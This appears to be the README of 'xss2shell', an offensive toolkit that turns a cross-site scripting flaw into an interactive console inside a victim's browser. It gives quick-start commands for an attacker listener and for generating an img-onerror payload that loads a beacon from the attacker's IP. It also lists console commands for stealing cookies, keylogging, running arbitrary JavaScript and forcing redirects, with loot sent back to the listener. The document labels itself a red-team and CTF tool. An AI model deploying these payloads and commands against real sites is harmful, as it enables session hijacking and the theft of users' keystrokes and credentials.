# xss2shell — XSS to interactive browser shell

Zero-dependency (Python stdlib only) XSS exploitation toolkit: generate a
payload, start the listener, and get an interactive JavaScript console
inside the victim's browser — cookie theft, keylogging, same-origin HTTP,
page source, redirects, and arbitrary JS eval.

Inspired by [JSshell](https://github.com/shelld3v/JSshell) and
[xsshell](https://github.com/raz-varren/xsshell), but the beacon uses a
**long-poll HTTP channel** instead of WebSockets, so it survives stricter
egress filters, CSP-framing contexts, and restrictive proxy chains.

## Quick start

```bash
# 1. listener (attacker machine)
python3 xss2shell.py --listen --port 8080

# 2. payload (prints beacon JS + injection vector)
python3 xss2shell.py --gen --host YOUR_IP --port 8080 --fmt img-onerror
#   -> <img src=x onerror="var s=document.createElement('script');...">

# 3. paste the payload into the XSS finding; beacon calls home
```

## Console commands

| command | effect |
|---------|--------|
| `help` | this help |
| `targets` / `use <id>` | list / select connected beacons |
| `cookie` | steal `document.cookie` |
| `src` | grab rendered page source (`outerHTML`) |
| `http GET\|POST <url> [body]` | same-origin HTTP request from victim page |
| `eval <js>` | execute JS in victim browser, print JSON result |
| `alert <msg>` | pop an alert |
| `redirect <url>` | force navigation |
| `kl` | start keylogger (keys stream to listener) |
| `raw <json>` | send a raw task |

Results stream to the console as they arrive; loot (keystrokes, cookies)
accumulates per beacon for later `exfil`-style post-processing.

## Protocol

- `GET /task?id=<beacon>` — beacon polls for a task dict (`{"cmd": ...}`)
- `POST /report` — beacon posts results / loot
- `GET /b.js` — serves the beacon script

No persistence: everything lives in listener memory.

> ⚠️ **Authorized use only.** This is a red-team/CTF tool. Only use against
> targets you own or have explicit permission to test.